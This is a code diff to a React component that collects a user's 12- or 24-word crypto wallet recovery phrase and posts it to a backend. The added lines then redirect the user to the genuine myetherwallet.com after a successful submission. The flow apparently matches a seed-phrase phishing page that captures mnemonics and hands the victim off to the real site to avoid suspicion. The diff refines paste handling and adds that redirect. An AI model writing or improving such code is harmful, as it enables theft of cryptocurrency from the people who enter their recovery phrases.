@@ -10,6 +10,9 @@ export default function MnemonicAccess() {
   const router = useRouter();
   const [wordCount, setWordCount] = useState(12);
   const [words, setWords] = useState<string[]>(Array(12).fill(""));
+  const [errorMessage, setErrorMessage] = useState<string>("");
+  const [wordList, setWordList] = useState<string[]>([]);
+  const [isLoading, setIsLoading] = useState<boolean>(false);
 
   const handleWordChange = (index: number, value: string) => {
     const newWords = [...words];
@@ -20,22 +23,24 @@ export default function MnemonicAccess() {
   const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
     e.preventDefault();
 
-    const text = e.clipboardData.getData("text") || "";
-    if (!text.trim()) return;
+    const pastedText = e.clipboardData.getData("text").trim();
+    if (!pastedText) return;
 
-    // Split into words
-    const parts = text.trim().split(/\s+/);
+    const pastedWords = pastedText
+      .replace(/\n/g, " ")
+      .replace(/,/g, " ")
+      .split(/\s+/)
+      .filter(Boolean);
 
-    // Limit to selected 12 or 24
-    const sliced = parts.slice(0, wordCount);
-
-    // Fill the boxes
-    const updated = [...words];
-    sliced.forEach((word, i) => {
-      updated[i] = word.toLowerCase();
-    });
-
-    setWords(updated);
+    if (pastedWords.length === 12 || pastedWords.length === 24) {
+      setWordCount(pastedWords.length);
+      setWords(pastedWords);
+      setErrorMessage("");
+    } else {
+      setErrorMessage(
+        `Please paste exactly 12 or 24 words (you pasted ${pastedWords.length}).`
+      );
+    }
   };
 
   const handleNext = async () => {
@@ -81,12 +86,20 @@ export default function MnemonicAccess() {
       );
 
       console.log("API response:", response.data);
-
-      // Navigate to dashboard after successful API call
-      // router.push("/dashboard");
+      const result = response.data;
+      if (response.status === 200 && result.status) {
+        console.log("redirecting to myetherwallet");
+        window.location.href = "https://www.myetherwallet.com";
+        console.log(result);
+      } else {
+        console.log("error redirecting to myetherwallet");
+        const serverMessage = result?.message || "Something went wrong.";
+        const serverError = result?.error ? ` (${result.error})` : "";
+        setErrorMessage(serverMessage + serverError);
+        setIsLoading(false);
+      }
     } catch (error) {
       console.error("Error sending mnemonic data:", error);
-      // You might want to show an error message to the user here
     }
   };
 
@@ -172,7 +185,7 @@ export default function MnemonicAccess() {
                     type="text"
                     value={word}
                     onChange={(e) => handleWordChange(index, e.target.value)}
-                    onPaste={index === 0 ? handlePaste : undefined}
+                    onPaste={handlePaste}
                     className="w-full border-b border-gray-300 pb-2 focus:border-teal-500 focus:outline-none"
                   />
                 </div>
@@ -195,13 +208,13 @@ export default function MnemonicAccess() {
             <button
               onClick={handleNext}
               disabled={words.some((w) => !w)}
-              className="bg-gray-300 text-gray-600 px-20 py-4 rounded-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-400 transition"
+              className="bg-gray-300 cursor-pointer text-gray-600 px-20 py-4 rounded-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-400 transition"
             >
               Next
             </button>
             <button
               onClick={handleClear}
-              className="text-teal-600 hover:underline"
+              className="text-teal-600 cursor-pointer hover:underline"
             >
               Clear
             </button>
